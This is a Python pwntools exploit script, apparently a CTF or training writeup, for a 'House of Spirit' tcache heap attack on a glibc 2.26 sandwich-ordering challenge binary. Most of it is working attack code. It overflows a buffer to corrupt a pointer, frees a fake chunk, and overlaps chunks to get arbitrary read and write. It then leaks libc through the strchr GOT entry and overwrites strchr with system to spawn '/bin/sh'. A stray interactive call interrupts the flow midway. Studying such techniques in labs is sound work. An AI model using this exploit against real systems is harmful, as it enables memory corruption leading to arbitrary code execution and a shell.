'''
House of Spirit Challenge writeup - Tcache on 2.26
Just found an alternate solution... :( 
- Instead of using the 'House of Spirit', you can just create a sandwich
in resturant_name and alter it from there. Not an intended solution...

What to do:
- Make another challenge for the house of spirit? 
- Just mention this NOT intended solution? Make it so that the 
  write the proper payload? 
''' 
from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.challenge-2.26'
libc_name = "../../libc_versions/libc-2.26.so"
elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 

# Send the name of the resturant
def set_resturant(name, intro=False):
	if(intro == False): 
		p.sendlineafter(">", "5")

	p.sendlineafter("name", name)

# Add a sandwich (order)
def add(jelly, butter): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("Type: ", jelly) # Input for butter
	p.sendlineafter("Type: ", butter)  # Input for jelly
	return 

# Remove the sandwich (eat)
def remove(index):
	p.sendlineafter(">", "2") 
	p.sendlineafter("remove:", str(index))
	return 

# Edit the most recent order
def edit(jelly, butter):
	p.sendlineafter(">", "4") 
	p.sendlineafter("Type: ", jelly) # Input for butter 
	p.sendlineafter("Type: ", butter) # Input for jelly 
	return 

# Print a sandwich
def print_wich(index): 
	p.sendlineafter(">", "3") 
	p.sendlineafter("view:", str(index))
	p.recvuntil("made a ") 
	butter = p.recvuntil(" butter").replace(" butter", "")
	p.recvuntil("and ")  
	jelly = p.recvuntil(" jelly").replace(" jelly", "") 
	return butter, jelly 

# Creates a fake chunk for the house of spirit
def fake_chunk():

	'''
	The freeing of chunks must meet the following requirements: 
	- Memory aligned (on 64-bit, this must end with a 0x0) 
	- A proper size must be used. 

	The 'resturant_name' is a fantastic candiate to put a 'fake chunk'
	because we control the contents of it well. This is important for two reasons: 
	- Easy to create a proper fake chunk
	- Once the chunk has been allocated (with a 'sandwich') we can alter the 
	  sandwich data values (including the pointers) with whatever we want!

	The fake chunk would look like this: 
	
	--------------
	prev_size 0x0 
	size 0x41 <-- Want to go into the 0x40 tcache bin
	--------------

	Haha, there is something wrong here! 'strcpy' does not copy 
	null bytes! So, we have to be clever here...
	The 'prev_size' is ONLY used if consolidation happens. So, 
	as long as consolidiation does NOT happen, this can be whatever
	value we want. 

	Although the 'prev_inuse' bit does not need to be set, it is easy 
	to set and can prevent issues down the road. 

	Real fake chunk: 

        --------------
        prev_size: AAAAAAAA
        size: 0x41 <-- Want to go into the 0x40 tcache bin
        --------------

	'''
	#######################
	# Create a fake chunk #
	#######################
	# The sizes of all the orders are of 0x40
	chunk_size = 0x41 

	# Filler for the prev_size 
	fake_chunk = "A" * 8 	# Offset 0x0
	
	# The fake chunk size
	fake_chunk += p64(chunk_size) # Offset 0x8

	# Use the resturant name as a fake chunk for later
	set_resturant(fake_chunk, intro = True)

	# With the fastbin, there is additional check here (in other POC) 

def house_of_spirit():
	###########################
	# Exploit Buffer Overflow #
	###########################

	'''
	Sandwich struct:
	------------
	0-7: jelly_ptr 
	8-47: Butter buffer
	48-55: next ptr
	------------

	The structure (after the butter variable) has a pointer to 
	the 'next' ptr. Because the butter variable has a buffer 
	overflow, we can OVERWRITE this with an arbitrary value. 
	Below is an example of this vulnerability: 

	------------
	0-7: jelly_ptr 
	8-47: Butter buffer
	48-55: AAAAAAAAA (corrupted) 
	------------

	We will set the 'next' pointer to the fake_chunk 
	(from the previous step) that we made. An example of this is shown below:

	------------
	0-7: jelly_ptr 
	8-47: Butter buffer
	48-55: fake_chunk (NICE)
	------------

	NOTE: If the location of 'next' does not point to 0x0 (on the fake chunk), 
	then it will continue trying to find MORE sandwiches. So, make sure that 
	the fake_chunk has 0x0 at that offset.

	'''

	print "Overwriting pointer with 0x40 chunk via buffer overflow"

	# Filler prior to overflow
	butter = "A" * 40 
	
	# Location of the 'resturant_name' variable, which holds our fake chunk.
	# We add 0x10 because the pointer (that the user is given) is mem + 0x10.
	butter += p64(elf.symbols['resturant_name'] + 0x10) 

	# Exploit the buffer overflow to overflow 'next' ptr.
	add("B" * 8, butter)
	
	p.interactive()
	###################
	# House of Spirit #
	################### 
	print "Freeing arbitrary pointer (House of Spirit)" 
	print "The resturant_name variable is now in the 0x40 tcache"	
	# Puts the 'fake chunk' (resturant_name variable) into the 0x40 tcache bin
	remove(1)

def overlap_chunks():
	
	''' 
	The 0x40 tcache has a single chunk inside of it, 
	which is the resturant_name variable fake_chunk. 
	This is what the tcache looks like: 

	0x20: 
	...
	0x40 bin: resturant_name + 0x10
	0x50:
	...


	If we create a NEW order, the chunk will be allocated to us, 
	which would be our fake chunk! This will NOW be within the resturant_name!
	'''

	#####################
	# Overlapping Chunk #
	#####################

	# Get the overlapping chunk that was added by the House of Spirit in the previous step
	add("C" * 8, "D" * 8) 


def read_write_prim():
	'''	
	After overlapping the chunks, resturant_name/sandwich will look like:

	----------------
	prev_size: AAAAAAAA                    <--------|
	size: 0x41                                      |
	jelly_ptr (start data section of chunk)         | This is all within resturant_name
	butter buffer                                   |
	next                                            |
	----------------                       <--------|

	Because we control the 'resturant_name' variable, we 
	will be able to write all over the data in the sandwich! 
	
	Anything look juicy here? There is a pointer (jelly_ptr) that we can 
	overwrite for both 'reading' and 'writing'! From this, we can
	create an arbitrary write or read primative 
	by overriding the sandwich->jelly_ptr variable by editing
	resturant_name.
	
	If we overwrite the sandwich->jelly_ptr, we can READ from anywhere
	via the 'print_wich' command. Additionally, to write anywhere, we just
	edit a sandwich. Of course, in order to set the location of where to read
	or write to, we need to alter this pointer via a call to 'set_resturant'. 

		
	We HAVE the primitive, but what to overwrite? The easiest way to get code
	execution is to overwrite a function pointer of somekind with either a 
	system or a one_gadget. In order to do this, we need to know WHERE LibC 
	is at. The best way to do this is use the GOT to leak an address to LibC. 

	The choice of GOT? 'strchr' works for both a READ (anything works for a read) 
	and a WRITE (shown in the next step). So, we can choose to use 'strchr' here. 
	'''


	##########################
	# Leak via Ptr Overwrite #		
	##########################
	print "Writing GOT table address over jelly_ptr to leak LibC"	

	# Overwrite the 'jelly_ptr' in order to create an arbitrary read/write.
	# The jelly_ptr is overwritten with the location of the strchr GOT entry	# This will have an address to GLibC at this location.
	set_resturant("A" * 0x10 + p64(elf.got['strchr']))
	_, jelly = print_wich(1)

	print("Address of strchr", hex(elf.got['strchr']))
	# By using the 'jelly_ptr' at strchar GOT entry, we leak GLibC.
	libc_leak = u64(jelly + "\x00\x00") 
	print("LibC Leak: ", hex(libc_leak)) 

	libc_base = libc_leak - libc_offset
	print "LibC Base: ", hex(libc_base)
	return libc_base


def win(libc_base):
	'''
	The 'jelly_ptr' is pointing to 'strchr' GOT entry (from the previous step).
	We overwrite this with 'system' because this gives us an easy shell. 
	'strchr' is a great GOT entry to overwrite because it accepts a 
	string that we control as the input. This emulates us calling system
	in the best way possible.

	Butter is used as the parameter for 'system'. This is because 
	'strchr' takes in a parameter that is a pointer to a string. 
	By passing in the buffer variable (which we control), we can 
	control the parameter for system. 
	'''
	##################
	# Code Execution # 
	##################
	print "Overwrite strchr with system"
	print "Sytem: ", hex(libc_base + system_offset) 

	edit(p64(libc_base + system_offset), "/bin/sh")
	p.sendline("/bin/sh")	


''' 
Plan: 

- Overwrite next pointer to point to the resturant (with a fake chunk) 
- House of spirit (free the chunk that we just corrupted) 
- Edit resturant to change jelly_ptr to PLT/GOT entry 
	- Use this to read (leak LibC) 
	- Use this to write (system) 
- Win :)

'''

system_offset = 0x3ef96
libc_offset = 0x1446d0

fake_chunk()
house_of_spirit()
overlap_chunks()
libc_base = read_write_prim()
win(libc_base)
p.interactive()


